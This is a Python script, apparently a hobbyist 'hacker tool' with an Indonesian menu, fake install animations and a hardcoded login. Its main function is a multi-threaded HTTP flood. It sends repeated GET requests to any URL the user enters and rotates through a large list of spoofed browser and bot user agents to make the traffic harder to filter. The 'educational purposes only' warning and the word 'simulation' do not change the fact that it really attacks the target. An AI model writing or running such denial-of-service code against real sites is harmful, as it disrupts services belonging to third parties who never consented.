import random
import time
import os
import sys
from colorama import Fore, init, Style
import socket
import threading
import subprocess
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import dns.resolver
import phonenumbers
from phonenumbers import carrier, geocoder, timezone

# color
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    
# Initialize colorama
init(autoreset=True)

# Login credentials
CORRECT_USERNAME = "X"
CORRECT_PASSWORD = "EXE"

def vertical_matrix_loading(duration=3, columns=5, speed=0.1):
    height = 20  # Number of lines for the vertical animation
    chars = "01"
    
    print(Fore.GREEN)  # Set text color to green
    
    # Create multiple columns of falling characters
    columns_data = []
    for _ in range(columns):
        columns_data.append({
            'position': random.randint(-height, 0),
            'speed': random.uniform(0.05, 0.2),
            'length': random.randint(5, 15)
        })
    
    start_time = time.time()
    while time.time() - start_time < duration:
        # Clear screen (but we'll just print newlines for this demo)
        print("\033[H")  # Move cursor to top-left
        
        # Build each line of the animation
        for line in range(height):
            line_text = ""
            for col in columns_data:
                if 0 <= line - col['position'] < col['length']:
                    # Make head character brighter
                    if line - col['position'] == col['length'] - 1:
                        line_text += Style.BRIGHT + random.choice(chars) + " "
                    else:
                        line_text += random.choice(chars) + " "
                else:
                    line_text += "  "
            print(line_text)
        
        # Update column positions
        for col in columns_data:
            col['position'] += col['speed']
            if col['position'] > height + col['length']:
                col['position'] = -col['length']
                col['length'] = random.randint(5, 15)
                col['speed'] = random.uniform(0.05, 0.2)
        
        time.sleep(speed)
    
    print(Fore.RESET + "\033[H")  # Reset color and move cursor

def install_tools_loading():
    tools = [
        "Kerangka X",
        "Modul EXE",
        "Protokol Keamanan",
        "Inti Matrix",
        "Komponen Antarmuka",
        "Alat Jaringan",
        "Suite Enkripsi",
        "Library Payload"
    ]
    
    width = 50  # Width of the progress bar
    print("\n" + Fore.YELLOW + "    ╔══════════════════════════════════════════════╗")
    print("    ║       MEMASANG ALAT X v1.0 (INDONESIA)      ║")
    print("    ╚══════════════════════════════════════════════╝" + Fore.RESET)
    
    for i in range(101):
        time.sleep(0.05)  # Faster progress for demo purposes
        
        # Calculate progress bar components
        filled = int(width * i / 100)
        empty = width - filled
        percent = i
        
        # Choose color based on progress
        if i < 30:
            color = Fore.RED
        elif i < 70:
            color = Fore.YELLOW
        else:
            color = Fore.GREEN
        
        # Build the progress bar
        progress_bar = color + "█" * filled + Fore.LIGHTBLACK_EX + "░" * empty
        
        # Randomly select a tool to show as currently installing
        current_tool = random.choice(tools) if i % 20 == 0 else ""
        
        print(f"\r    {progress_bar} {color}{percent:3}%", end="")
        print(f" {Fore.CYAN}{current_tool.ljust(20)}", end="")
        
        # Flush output to make sure it updates immediately
        sys.stdout.flush()
    
    print("\n\n" + Fore.GREEN + "    Pemasangan berhasil! Menjalankan sistem..." + Fore.RESET)
    time.sleep(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_exe_banner():
    colors = [Fore.RED, Fore.WHITE, Fore.RED, Fore.WHITE, Fore.RED, Fore.WHITE]
    exe_art = """
    ╔══════════════════════════════════════════════╗
    ║ ███████╗██╗  ██╗███████╗  ███████╗██╗  ██╗ ║
    ║ ██╔════╝╚██╗██╔╝██╔════╝  ╚════██║╚██╗██╔╝ ║
    ║ █████╗   ╚███╔╝ █████╗      ███╔═╝ ╚███╔╝  ║
    ║ ██╔══╝   ██╔██╗ ██╔══╝     ██╔══╝  ██╔██╗  ║
    ║ ███████╗██╔╝ ██╗███████╗  ███████╗██╔╝ ██╗ ║
    ║ ╚══════╝╚═╝  ╚═╝╚══════╝  ╚══════╝╚═╝  ╚═╝ ║
    ╚══════════════════════════════════════════════╝
    """
    
    # Split the art into lines and color each line differently
    lines = exe_art.split('\n')
    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        print(color + line)

def show_banner():
    print(Fore.RED + "\n    ╔══════════════════════════════════════════════╗")
    print("    ║          TOOLS BY X - VERSION INDONESIA       ║")
    print("    ╚══════════════════════════════════════════════╝" + Fore.RESET)

def login():
    max_attempts = 3
    attempts = 0
    
    while attempts < max_attempts:
        clear_screen()
        show_exe_banner()
        print(Fore.YELLOW + "\n    ╔══════════════════════════════════════════════╗")
        print("    ║             LOGIN KEAMANAN EXE             ║")
        print("    ╚══════════════════════════════════════════════╝")
        
        username = input(Fore.CYAN + "\n    Username: " + Style.RESET_ALL)
        password = input(Fore.CYAN + "    Password: " + Style.RESET_ALL)
        
        if username == CORRECT_USERNAME and password == CORRECT_PASSWORD:
            print(Fore.GREEN + "\n    Login berhasil! Memulai sistem...")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(Fore.RED + f"\n    Kredensial tidak valid! Sisa percobaan: {remaining}.")
            time.sleep(2)
    
    print(Fore.RED + "\n    Batas percobaan login terlampaui. Sistem terkunci.")
    time.sleep(3)
    return False

def show_menu():
    clear_screen()
    show_exe_banner()
    show_banner()
    print(Fore.WHITE + """
    ╔══════════════════════════════════════════════╗
    ║                MENU UTAMA EXE               ║
    ╠══════════════════════════════════════════════╣
    ║                                              ║
    ║  1. Tentang EXE                             ║
    ║  2. Serangan DDoS Web EXE                   ║
    ║  3. Keluar EXE                              ║
    ║                                              ║
    ╚══════════════════════════════════════════════╝
    """)
    
    try:
        choice = int(input(Fore.CYAN + "\nPilih opsi: " + Fore.RESET))
        return choice
    except ValueError:
        return -1

def about():
    clear_screen()
    show_exe_banner()
    show_banner()
    about_text = Fore.WHITE + """
    ╔══════════════════════════════════════════════╗
    ║              TENTANG TOOLS EXE               ║
    ╠══════════════════════════════════════════════╣
    ║                                              ║
    ║ TOOLS INI DI BUAT OLEH X                    ║
    ║  TIDAK DI GUNAKAN UNTUK HAL YANG ILEGAL.    ║
    ║  JIKA KETAHUAN ADA YANG MENGGUNAKAN TOOLS   ║
    ║  INI SECARA ILEGAL KAMI TIDAK BERTANGGUNG   ║
    ║  JAWAB                                       ║
    ║                                              ║
    ║  Versi: 1.0 EXE RILIS INDONESIA             ║
    ║  Pembuat: X                                 ║
    ║  Status: AKTIF                              ║
    ║  Keamanan: TERLINDUNGI                      ║
    ║                                              ║
    ╚══════════════════════════════════════════════╝
    """
    print(about_text)
    input(Fore.CYAN + "\nTekan Enter untuk kembali ke menu..." + Fore.RESET)

def ddos_web():
    clear_screen()
    print(f"{Colors.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}         WEB DDoS TOOL (FOR EDUCATIONAL PURPOSES)    {Colors.RED}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}[!] WARNING: This tool is for educational purposes only!")
    print(f"[!] Do not use this for illegal activities!{Colors.RESET}")
    
    confirm = input(f"\n{Colors.YELLOW}[?] Do you understand and agree? (y/n): {Colors.RESET}")
    if confirm.lower() != 'y':
        return
    
    url = input(f"\n{Colors.YELLOW}[?] Enter target URL (e.g., http://example.com): {Colors.RESET}")
    threads_count = int(input(f"{Colors.YELLOW}[?] Number of threads (default 10): {Colors.RESET}") or 10)
    duration = int(input(f"{Colors.YELLOW}[?] Duration in seconds (default 10): {Colors.RESET}") or 10)
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        # Verify target is reachable
        response = requests.get(url, timeout=5)
        if response.status_code >= 400:
            print(f"{Colors.RED}[!] Target seems unreachable (HTTP {response.status_code}){Colors.RESET}")
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")
            return
    
        print("\nPreparing DDoS attack simulation...")
        time.sleep(2)
        
        stop_flag = False
        requests_sent = 0
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPod; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux i686; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0 Mobile/15E148 Safari/605.1.15',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0 Mobile/15E148 Safari/605.1.15',
            'Mozilla/5.0 (iPod touch; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/36.0 Mobile/15E148 Safari/605.1.15',
            'Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0',
            
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPod touch; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/14.0 Mobile/10A5355d Safari/602.1',
            
            # Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
            
            # Opera
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203',
            'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36 OPR/63.3.3216.58675',
            
            # Other browsers
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0 Waterfox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Vivaldi/4.0',
            
            # Mobile browsers
            'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 EdgiOS/46.3.7 Mobile/15E148 Safari/605.1.15',
            
            # Tablets
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 10; SM-T860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Safari/537.36',
            
            # Game consoles
            'Mozilla/5.0 (PlayStation 4 8.52) AppleWebKit/605.1.15 (KHTML, like Gecko)',
            'Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/609.4 (KHTML, like Gecko) NF/6.0.2.20.2 NintendoBrowser/5.1.0.22407',
            
            # Smart TVs
            'Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 DMOST/2.0.0 (; LGE; webOSTV; WEBOS6.2.0 03.21.25; W6_lm21a;)',
            'Mozilla/5.0 (SMART-TV; Linux; Tizen 5.5) AppleWebKit/538.1 (KHTML, like Gecko) Version/5.5 TV Safari/538.1',
            
            # Crawlers and bots
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
            
            # Legacy browsers
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
            
            # Random mobile devices
            'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            
            # Random desktop browsers
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
            
            # More obscure browsers
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Vivaldi/4.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Brave/91.0',
            
            # Even more user agents
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Whale/2.10.123.42',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Sleipnir/6.2.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 CocCoc/91.0.146',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 QQBrowser/10.7.4313.400',
            
            # More mobile user agents
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
            'Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            
            # More tablet user agents
            'Mozilla/5.0 (Linux; Android 10; SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Safari/537.36',
            
            # More desktop user agents
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko'
        ]
        
        def attack():
            nonlocal requests_sent
            while not stop_flag:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents)
                    }
                    requests.get(url, headers=headers, timeout=1)
                    requests_sent += 1
                except:
                    pass
        
        threads = []
        for _ in range(threads_count):
            thread = threading.Thread(target=attack)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        print(f"\n{Colors.RED}[!] Simulating DDoS attack (press Ctrl+C to stop)...{Colors.RESET}")
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                requests_per_sec = requests_sent / elapsed if elapsed > 0 else 0
                print(f"\r{Colors.YELLOW}Requests sent: {requests_sent} | RPS: {requests_per_sec:.1f}", end="")
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        
        stop_flag = True
        for thread in threads:
            thread.join()
        
        total_time = time.time() - start_time
        requests_per_sec = requests_sent / total_time if total_time > 0 else 0
        
        print(f"\n\n{Colors.CYAN}=== ATTACK SUMMARY ==={Colors.RESET}")
        print(f"{Colors.WHITE}Target: {url}")
        print(f"Duration: {total_time:.1f} seconds")
        print(f"Threads: {threads_count}")
        print(f"Total requests sent: {requests_sent}")
        print(f"Requests per second: {requests_per_sec:.1f}{Colors.RESET}")
        
    except requests.exceptions.RequestException:
        print(f"{Colors.RED}[!] Could not connect to target{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

def main():
    # Initial system check
    print(Fore.YELLOW + "\n    Memeriksa persyaratan sistem..." + Fore.RESET)
    time.sleep(1)
    
    # Show installation progress
    install_tools_loading()
    
    # Show vertical matrix loading
    vertical_matrix_loading(2)
    
    # Login system
    if not login():
        return
    
    # Main menu loop
    while True:
        choice = show_menu()
        
        if choice == 1:
            about()
        elif choice == 2:
            ddos_web()
        elif choice == 3:
            print(Fore.YELLOW + "Keluar dari sistem EXE dengan aman..." + Fore.RESET)
            vertical_matrix_loading(1)
            break
        else:
            print(Fore.RED + "Pilihan EXE tidak valid!")
            time.sleep(1)

if __name__ == "__main__":
    main()
